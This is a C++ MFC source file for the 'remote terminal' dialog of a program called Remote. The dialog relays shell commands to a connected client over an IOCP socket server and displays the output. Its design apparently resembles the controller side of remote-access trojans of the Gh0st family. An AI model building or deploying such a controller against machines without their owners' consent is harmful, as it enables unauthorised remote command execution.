// ShellDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "Remote.h"
#include "ShellDlg.h"
#include "afxdialogex.h"
#include "Common.h"

// CShellDlg 对话框

IMPLEMENT_DYNAMIC(CShellDlg, CDialog)

CShellDlg::CShellDlg(CWnd* pParent /*=NULL*/,
	IOCPServer* IOCPServer, CONTEXT_OBJECT *ContextObject)
	: CDialog(IDD_DIALOG_SHELL, pParent)
{
	m_IocpServer = IOCPServer;
	m_ContextObject = ContextObject;

	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_SHELL));
}

CShellDlg::~CShellDlg()
{
}

VOID CShellDlg::OnReceiveComplete()
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	AddKeyBoardData();
	m_nReceiveLength = m_Edit.GetWindowTextLength();
}

VOID CShellDlg::AddKeyBoardData()
{
	m_ContextObject->InDeCompressedBuffer.WriteBuffer((LPBYTE)"", 1);
	CString strResult = (char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(0);

	//替换
	strResult.Replace("\n", "\r\n");
	//获得原始长度
	int iLength = m_Edit.GetWindowTextLength();
	
	m_Edit.SetSel(iLength, iLength);
	//显示
	m_Edit.ReplaceSel(strResult);
	m_nCursel = m_Edit.GetWindowTextLength();

}

void CShellDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT, m_Edit);
}


BEGIN_MESSAGE_MAP(CShellDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_CTLCOLOR()
END_MESSAGE_MAP()


// CShellDlg 消息处理程序


BOOL CShellDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  在此添加额外的初始化

	m_nCursel = 0;
	m_nReceiveLength = 0;
	SetIcon(m_hIcon,FALSE);
	CString str;
	sockaddr_in ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));

	int ClientAddrLength = sizeof(ClientAddr);

	BOOL bResult = getpeername(m_ContextObject->ClientSocket,
		(SOCKADDR*)&ClientAddr, &ClientAddrLength);

	str.Format("\\\\%s - 远程终端", bResult != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "");

	SetWindowText(str);
	BYTE bToken = COMMAND_NEXT;
	m_IocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(BYTE));
	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CShellDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值
	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->ClientSocket);
	closesocket(m_ContextObject->ClientSocket);
	CDialog::OnClose();
}


BOOL CShellDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (pMsg->message == WM_KEYDOWN)
	{
		// 屏蔽VK_ESCAPE、VK_DELETE
		if (pMsg->wParam == VK_ESCAPE || pMsg->wParam == VK_DELETE)
		{
			return TRUE;
		}
		//如果是可编辑框的回车键
		if (pMsg->wParam == VK_RETURN && pMsg->hwnd == m_Edit.m_hWnd)
		{
			int iLength = m_Edit.GetWindowTextLength();
			CString str;
			m_Edit.GetWindowText(str);
			str += "\r\n";
			m_IocpServer->OnClientPreSending(m_ContextObject, (LPBYTE)str.GetBuffer(0) + m_nCursel,
				str.GetLength() - m_nCursel);
			//重新定位m_nCurSel
			m_nCursel = m_Edit.GetWindowTextLength();

		}
		if (pMsg->wParam == VK_BACK && pMsg->hwnd == m_Edit.m_hWnd)
		{
			if (m_Edit.GetWindowTextLength() <= m_nReceiveLength)
			{
				return TRUE;
			}
				
		}
	}

	return CDialog::PreTranslateMessage(pMsg);
}


HBRUSH CShellDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  在此更改 DC 的任何特性

	if (pWnd->GetDlgCtrlID() == IDC_EDIT && (nCtlColor == CTLCOLOR_EDIT))
	{
		COLORREF clr = RGB(255, 255, 255);
		pDC->SetTextColor(clr);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);
		return CreateSolidBrush(clr);
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}

	// TODO:  如果默认的不是所需画笔，则返回另一个画笔
	return hbr;
}
